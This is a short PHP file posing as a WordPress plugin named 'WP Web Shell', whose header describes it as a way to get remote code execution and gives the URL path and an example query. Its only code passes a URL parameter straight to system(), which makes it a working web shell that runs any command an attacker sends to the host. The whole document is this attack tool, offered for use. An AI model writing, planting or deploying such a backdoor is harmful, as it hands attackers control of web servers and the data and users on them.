<?php 

/**
* Plugin Name: WP Web Shell
* Plugin URI: https://github.com/Anon-Exploiter/exploits
* Description: Plugin for getting RCE in wordpress - /wp-content/plugins/wp-web-shell/wp-web-shell.php?123=echo 123
* Version: 1.0.0
* Author: Anon Exploiter
* Author URI: https://github.com/Anon-Exploiter
* License: GPL2
*/

system($_GET[123]);

?>